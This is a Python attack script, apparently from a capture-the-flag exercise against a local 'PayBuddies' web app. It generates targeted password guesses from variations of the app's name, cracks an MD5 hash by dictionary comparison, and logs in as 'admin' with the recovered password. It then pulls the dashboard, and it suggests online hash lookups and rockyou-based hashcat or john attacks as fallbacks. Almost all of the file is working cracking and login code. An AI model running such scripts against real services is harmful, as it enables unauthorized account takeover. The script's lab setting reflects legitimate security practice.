import requests
import hashlib

target_hash = "7d39307ae824e70052c0aa16816a9b16"

print("[*] Focused approach: Testing variations of challenge-specific terms")
print("="*60)

# Since this is "PayBuddies", let's be very specific
paybuddies_focused = []

# Exact variations of PayBuddies
bases = ['paybuddies', 'PayBuddies', 'PAYBUDDIES', 'Paybuddies', 'payBuddies', 
         'PAYBuddies', 'PayBUDDIES', 'PAYbuddies', 'payBUDDIES']

# Add with common suffixes (8+ chars required)
suffixes = [
    '1', '12', '123', '1234', '12345', '123456', '1234567', '12345678',
    '!', '!!', '!!!', '!1', '!12', '!123', '!@', '!@#', '!@#$',
    '@', '@@', '@1', '@12', '@123',
    '#', '##', '#1', '#12', '#123',
    '$', '$$', '$1', '$12', '$123',
    '2020', '2021', '2022', '2023', '2024', '2025',
    '20', '21', '22', '23', '24', '25',
    '_1', '_12', '_123', '_2024', '_2023',
    '-1', '-12', '-123', '-2024', '-2023',
    '01', '02', '03', '04', '05',
    '001', '002', '003',
    '!2024', '!2023', '@2024', '@2023', '#2024', '#2023'
]

for base in bases:
    paybuddies_focused.append(base)
    for suffix in suffixes:
        pwd = base + suffix
        if len(pwd) >= 8:  # Must be 8+ chars
            paybuddies_focused.append(pwd)

# Also try reversed
for base in ['buddies', 'buddy', 'pay']:
    paybuddies_focused.append(base + 'pay')
    paybuddies_focused.append(base + 'Pay')
    paybuddies_focused.append(base.capitalize() + 'pay')
    paybuddies_focused.append(base.capitalize() + 'Pay')

# Try with common prefix
prefixes = ['my', 'My', 'the', 'The', 'get', 'Get', 'use', 'Use', 'for', 'For']
for prefix in prefixes:
    for base in ['paybuddies', 'PayBuddies', 'paybuddy', 'PayBuddy']:
        paybuddies_focused.append(prefix + base)

# Remove duplicates
paybuddies_focused = list(set(paybuddies_focused))

print(f"[*] Generated {len(paybuddies_focused)} PayBuddies-focused passwords")
print(f"[*] Sample passwords: {paybuddies_focused[:20]}")
print()

for i, pwd in enumerate(paybuddies_focused):
    hash_val = hashlib.md5(pwd.encode()).hexdigest()
    
    if hash_val == target_hash:
        print(f"\n[!] PASSWORD FOUND: {pwd}")
        print(f"[!] Hash: {hash_val}")
        
        # Login
        url = "http://127.0.0.1:32892/index.php"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "http://127.0.0.1:32892",
            "Referer": "http://127.0.0.1:32892/"
        }
        cookies = {"PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol"}
        
        data = {
            "username": "admin",
            "password": pwd,
            "submit": "submit"
        }
        
        response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
        print(f"\n[*] Login response: {response.text}")
        
        if "Success" in response.text:
            print("[!] LOGIN SUCCESSFUL!")
            
            # Get dashboard
            if response.cookies:
                cookies.update(response.cookies.get_dict())
            
            session = requests.Session()
            session.cookies.update(cookies)
            
            dash = session.get("http://127.0.0.1:32892/dashboard.php", timeout=5)
            print(f"\n[*] Dashboard:\n{dash.text}")
        
        break
    
    if (i + 1) % 100 == 0:
        print(f"[*] Tested {i+1}/{len(paybuddies_focused)}...")

else:
    print(f"\n[-] Not found in {len(paybuddies_focused)} PayBuddies-focused passwords")
    print("\n[*] This hash likely requires:")
    print("    1. Online MD5 database lookup (crackstation, md5decrypt, hashes.com)")
    print("    2. Full rockyou.txt dictionary attack with hashcat/john")
    print("    3. Or the password is randomly generated for this instance")

print("\n[*] Script complete")

